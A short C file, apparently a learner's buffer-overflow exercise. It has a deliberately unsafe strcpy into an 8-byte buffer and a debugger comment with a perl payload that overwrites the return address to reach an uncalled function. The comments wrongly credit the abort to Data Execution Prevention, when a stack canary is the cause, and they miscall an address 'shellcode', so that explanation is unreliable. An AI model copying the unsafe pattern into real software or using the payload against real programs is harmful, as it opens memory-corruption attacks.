/*run in debugger:
run `perl -e 'print "\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40\x4b\x06\x40";'`

shellcode represents the address at which the first instruction for avoid () begins. It could alter for different compilations. This one managed to overwrite the stack so the return address pointed to avoid () (which is otherwise not called from the program) instead of back to main (). But caused stack smashing and corrupted memory, test failed, but managed to overwrite stack return address
*/

/*
	NOTE: Now we know that this is due to Data Execution Prevention Feature, present in every modern OS to tackle the buffer overflow based execution redirection exploits.
*/

#include <stdio.h>
#include <string.h>

void func (const char *data) {
	char buffer [8] = "xxxxxxx";
	strcpy (buffer, data);
	printf ("%s\n", buffer);
}
void avoid () {
	printf ("You shouldn't be here\n");
}

int main (int argc, char *argv []) {
	func (argv [1]);
	return (0);
}
